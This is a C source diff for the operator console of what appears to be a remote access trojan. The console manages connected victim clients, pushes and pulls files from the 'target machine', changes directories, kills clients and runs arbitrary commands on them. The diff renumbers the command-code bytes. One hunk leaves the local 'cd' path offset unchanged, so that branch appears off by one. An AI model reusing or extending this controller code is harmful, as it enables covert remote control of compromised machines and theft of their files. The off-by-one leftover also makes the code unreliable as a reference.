@@ -130,6 +130,7 @@ size_t get_line(char* buf) {
 	char c;
 	size_t cmd_len = 0;
 
+	buf[cmd_len++] = '0';
 	c = getchar();
 	while (c != '\n' && cmd_len < BUFLEN) {
 		buf[cmd_len++] = c;
@@ -169,12 +170,12 @@ void list_connections(Conn_array* conns) {
 // Function to receive file from target machine (TCP file transfer).
 int send_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 	// Send command to the client to be parsed.
-	buf[6] = '2';
-	if (!send(client_socket, &buf[6], cmd_len, 0))
+	buf[7] = '3';
+	if (!send(client_socket, &buf[7], cmd_len, 0))
 		return SOCKET_ERROR;
 
 	// Open file.
-	FILE* fd = fopen(&buf[7], "rb");
+	FILE* fd = fopen(&buf[8], "rb");
 
 	uint32_t bytes = 0;
 	size_t f_size = 0;
@@ -213,8 +214,7 @@ int send_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 
 
 // Function to copy int bytes to new memory location to abide strict aliasing.
-inline uint32_t ntohl_conv(char const* num)
-{
+inline uint32_t ntohl_conv(char const* num) {
 	uint32_t new;
 	memcpy(&new, num, sizeof(new));
 	// Return deserialized bytes.
@@ -224,11 +224,11 @@ inline uint32_t ntohl_conv(char const* num)
 // Function to receive file from target machine (TCP file transfer).
 int recv_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 	// Send command to the client to be parsed.
-	buf[8] = '3';
-	if (!send(client_socket, &buf[8], cmd_len, 0))
+	buf[9] = '4';
+	if (!send(client_socket, &buf[9], cmd_len, 0))
 		return SOCKET_ERROR;
 
-	FILE* fd = fopen(&buf[9], "wb");
+	FILE* fd = fopen(&buf[10], "wb");
 
 	// Receive file size.
 	if (!recv(client_socket, buf, sizeof(uint32_t), 0))
@@ -252,8 +252,8 @@ int recv_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 
 // Function send change directory command to client.
 int client_cd(char* buf, size_t cmd_len, SOCKET client_socket) {
-	buf[2] = '0';
-	if (!send(client_socket, &buf[2], cmd_len, 0))
+	buf[3] = '1';
+	if (!send(client_socket, &buf[3], cmd_len, 0))
 		return SOCKET_ERROR;
 
 	return 1;
@@ -261,7 +261,7 @@ int client_cd(char* buf, size_t cmd_len, SOCKET client_socket) {
 
 // Function to terminate client.
 int terminate_client(char* buf, size_t cmd_len, SOCKET client_socket) {
-	send(client_socket, "1", cmd_len, 0);
+	send(client_socket, "2", cmd_len, 0);
 
 	return 0;
 }
@@ -325,15 +325,16 @@ void interact(Conn_array* conns, char* buf, int client_id) {
 		// Set all bytes in buffer to zero.
 		memset(buf, '\0', BUFLEN);
 		size_t cmd_len = get_line(buf);
+		char* cmd = &buf[1];
 
 		if (cmd_len) {
-			if (compare(buf, "background")) {
+			if (compare(cmd, "background")) {
 				return;
 			}
 			else {
 				// If a command is parsed call it's corresponding function else execute-
 				// the command on the client.
-				func target_func = parse_cmd(buf);
+				func target_func = parse_cmd(cmd);
 				if (target_func) {
 					iResult = target_func(buf, cmd_len, client_socket);
 				}
@@ -386,9 +387,10 @@ void sakito_console(Conn_array* conns) {
 		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
 		char buf[BUFLEN + 1] = { 0 };
 		size_t cmd_len = get_line(buf);
+		char* cmd = &buf[1];
 
 		if (cmd_len) {
-			if (compare(buf, "exit")) {
+			if (compare(cmd, "exit")) {
 				// if there's any connections close them before exiting.
 				if (conns->size) {
 					for (size_t i = 0; i < conns->size; i++) {
@@ -399,18 +401,18 @@ void sakito_console(Conn_array* conns) {
 				}
 				return;
 			}
-			else if (compare(buf, "cd ")) {
+			else if (compare(cmd, "cd ")) {
 				// List all connections.
 				_chdir(&buf[3]);
 			}
-			else if (compare(buf, "list")) {
+			else if (compare(cmd, "list")) {
 				// List all connections.
 				list_connections(conns);
 			}
-			else if (compare(buf, "interact ")) {
+			else if (compare(cmd, "interact ")) {
 				// Interact with client.
 				int client_id;
-				client_id = atoi(&buf[9]);
+				client_id = atoi(&cmd[9]);
 				if (!conns->size || client_id < 0 || client_id > conns->size - 1) {
 					printf("Invalid client identifier.\n");
 				}
@@ -420,7 +422,7 @@ void sakito_console(Conn_array* conns) {
 			}
 			else {
 				// Execute command on host system.
-				exec_cmd(buf);
+				exec_cmd(cmd);
 			}
 		}
 	}
